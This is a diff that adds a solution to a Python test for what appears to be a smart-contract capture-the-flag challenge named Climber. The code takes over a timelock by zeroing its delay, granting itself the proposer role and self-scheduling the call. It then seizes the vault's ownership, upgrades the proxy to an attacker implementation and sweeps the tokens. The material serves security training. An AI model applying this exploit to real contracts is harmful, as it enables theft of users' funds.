@@ -70,6 +70,48 @@ def test_solve_challenge():
     ##############################
     ##### SOLUTION GOES HERE #####
     ##############################
+    from brownie import ClimberAttack, GetSelector, ClimberUpgrade
     
+    # web3
+    web3 = import_web3()
+
+    # contract to get function selectors
+    get_selector = GetSelector.deploy(_fromAttacker)
+    gs = lambda func: get_selector.getSelector(func)
+
+    # deploy attacker contract
+    attacker_contract = ClimberAttack.deploy(timelock.address, _fromAttacker)
+
+    # targets, values, dataElements and salt of the call
+    targets = [timelock.address, timelock.address, proxy_vault.address, attacker_contract.address]
+    values = [0, 0, 0, 0]
+    dataElements = [timelock.updateDelay.encode_input(0),
+        gs('grantRole(bytes32,address)').hex() + timelock.PROPOSER_ROLE().hex() + '0'*24 + attacker_contract.address[2:],
+        gs('transferOwnership(address)').hex() + '0'*24 + attacker.address[2:],
+        gs('schedule()').hex()]
+    salt = web3.solidityKeccak(['string'],['0'])
+    for element in dataElements:
+        print(element)
+    # malicious execute call (remove function selector, as it's not needed)
+    malicious_call = timelock.execute.encode_input(
+        targets,
+        values,
+        dataElements,
+        salt
+    )[10:]
+    print(malicious_call)
+
+    # perform malicious call
+    attacker_contract.attack(malicious_call, _fromAttacker)
+
+    # deploy upgrade contract
+    upgrade_contract = ClimberUpgrade.deploy(_fromAttacker)
+
+    # upgrade the vault contract implementation
+    proxy_vault.upgradeTo(upgrade_contract.address, _fromAttacker)
+
+    # sweep the funds
+    proxy_vault.sweepFunds(token.address, _fromAttacker)
+
     ######################
     check_solution()
